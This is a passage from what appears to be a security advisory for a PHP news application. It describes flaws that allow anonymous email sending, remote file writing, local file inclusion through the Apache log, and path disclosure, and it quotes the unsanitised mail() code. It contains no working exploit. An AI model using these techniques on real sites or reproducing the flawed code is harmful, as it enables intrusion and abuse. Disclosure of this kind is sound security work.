that  allows  a  guest  to  write  arbitrary files on the
system, include local files, read local files etc..


III. ANALYSIS

Summary:

A) Anonymous email

The mailto.php file allows a guest to send arbitrary emails.
The input is not properly sanitised:

if (ValidEmailAdress($youremail) and ValidEmailAdress($friendemail))
{
	mail ($friendemail, $display[$lang]["mailtoafriend"],"$comments\n\n".$url."print".$LNF_file_extension."?art=$newsfilename\n\n$yourname", "From: $youremail");


B) Remote File Writing

The save-edited-news.php  file  allows a guest to write a
file  on the  system.  This  vulnerability may be used to
execute remote commands on the system.

include PHP function. This  vulnerability  may be used to
execute remote commands by including the Apache Log file.

including the full path of the file.  This  path  may  be
very useful for local file inclusion and other.
